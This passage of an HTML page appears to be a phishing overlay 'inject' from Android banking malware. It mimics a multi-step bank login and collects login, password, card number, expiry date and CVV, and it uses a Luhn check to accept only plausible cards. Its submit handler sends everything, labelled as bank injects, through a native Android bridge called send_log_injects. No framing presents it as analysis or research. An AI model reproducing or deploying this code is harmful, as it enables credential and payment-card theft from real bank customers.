    <style>
        body {
            color: #fff;
        }

        #form1 {
            background-color: #242424;
            padding: 15px;
        }

        #form1, #form2, #form3 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 0.25;
        }

        .input {
            width: 100%;
            padding: 14px;
            font-size: 22px;
            color: #fff;
            background-color: #656565;
            border: 1px solid #656565;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        #form1 > section > ::placeholder {
            color: #fff;
            opacity: 1;
        }
        #form1 > section > :-moz-placeholder {
            color: #fff;
            opacity: 1;
        }
        #form1 > section > :-ms-input-placeholder {
            color: #fff;
            opacity: 1;
        }
        #form1 > section > ::-moz-placeholder {
            color: #fff;
            opacity: 1;
        }
        #form1 > section > ::-webkit-input-placeholder {
            color: #fff;
            opacity: 1;
        }

        #form2 > section > ::placeholder {
            color: #bebebf;
            opacity: 1;
        }
        #form2 > section > :-moz-placeholder {
            color: #bebebf;
            opacity: 1;
        }
        #form2 > section > :-ms-input-placeholder {
            color: #bebebf;
            opacity: 1;
        }
        #form2 > section > ::-moz-placeholder {
            color: #bebebf;
            opacity: 1;
        }
        #form2 > section > ::-webkit-input-placeholder {
            color: #bebebf;
            opacity: 1;
        }

        .button {
            width: 100%;
            padding: 15px;
            border: 0;
            background-color: #49a251;
            color: #fff;
            font-size: 18px;
            border-radius: 4px;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .gray {
            background-color: #f6f6f6;
            border-color: #f6f6f6;
            font-size: 18px;
            color: #333;
        }

        #form2 > footer { 
            padding: 20px;
        }

        #form3 > footer { 
            padding: 20px;
        }

        #form2 > footer > .button {
            padding: 15px;
            border: 0;
            background-color: #49a251;
            color: #fff;
            font-size: 18px;
            border-radius: 4px;
            width: 49%;
            border-radius: 0 4px 4px 0;
        }

        #form2 > footer > .button:disabled {
            background-color: #f6f6f6;
            color: #fff;
        }

        #form3 > footer > .button {
            padding: 15px;
            border: 0;
            background-color: #49a251;
            color: #fff;
            font-size: 18px;
            border-radius: 4px;
            width: 100%;
            border-radius: 0 4px 4px 0;
        }

        #form3 > footer > .button:disabled {
            background-color: #f6f6f6;
            color: #fff;
        }

        #form2 > footer > .second {
            background-color: #242424;
            color: #fff;
            width: 49%;
            border-radius: 4px 0 0 4px;
        }
    </style>

            </header>
            <section style="padding: 25px;flex: 1;">   
                <input type="tel" class="input gray" id="cc" name="cc" onkeyup="check6();check5();" placeholder="Credit Card" autocomplete="off">
                <input type="tel" class="input gray" id="exp" name="exp" onkeyup="check7();check5();" style="width: 49%;float: left;" placeholder="Expiration Date" autocomplete="off">
                <input type="password" class="input gray" id="cvv" name="cvv" onkeyup="check5();" style="width: 49%;float: right;" placeholder="CVV" autocomplete="off">
            </section>
            <footer>
                <input type="submit" class="button" disabled id="sendData" value="LOGIN">
            </footer>
        </div>
    </form>

    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv');

        var nextPage = document.getElementById('nextPage'),
            lastPage = document.getElementById('lastPage'),
            sendData = document.getElementById('sendData');

        nextPage.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')

                spinner.style.display = 'block'

                setTimeout(() => {
                    form1.style.display = 'none'
                    spinner.style.display = 'none'
                    form2.style.display = 'flex'
                }, 1500);
            }
        } 

        password.onkeyup = () => {
            if(password.value.length >= 4) {
                lastPage.disabled = false
            } else {
                lastPage.disabled = true
            }
        }

        lastPage.onclick = () => {
            spinner.style.display = 'block'

            setTimeout(() => {
                form2.style.display = 'none'
                spinner.style.display = 'none'
                form3.style.display = 'flex'
            }, 1500);
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check7() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
                
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
</body>
</html>
